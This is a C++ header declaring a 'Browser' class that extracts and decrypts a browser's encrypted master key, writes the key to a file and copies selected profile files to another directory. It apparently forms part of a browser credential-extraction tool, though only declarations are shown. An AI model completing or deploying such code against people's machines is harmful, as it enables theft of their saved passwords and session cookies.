#pragma once

#include <iostream>
#include <vector>

#define AES_KEY_SIZE_IN_BYTES	 	32

class Browser {

private:
	std::string					BrowserName;			
	unsigned char AES_KEY[AES_KEY_SIZE_IN_BYTES + 1] = {};


public:		// Static variables
	static const std::vector<std::string> relativePaths;
	static const std::vector<std::string> impFiles;

private:
	std::string extractEncryptedKey(const std::string& jsonData);
	bool isImportantFile(const std::string& path);
	std::string getKeyFilePath(const std::string &path);
	std::string getEncryptedMasterKey(const std::string& keyFilePath);
	std::string decryptMasterKey(const std::string& encryptedKey);

public:
	void ExtractKey(const std::string &path);
	void ExtractFiles(const std::string &paths, const std::string& destinationDir);
	void ShowKey(void);
	void WriteExtractedKeyToFile(const std::string &path);
	std::string BrowserNameFinder(const std::string path);
};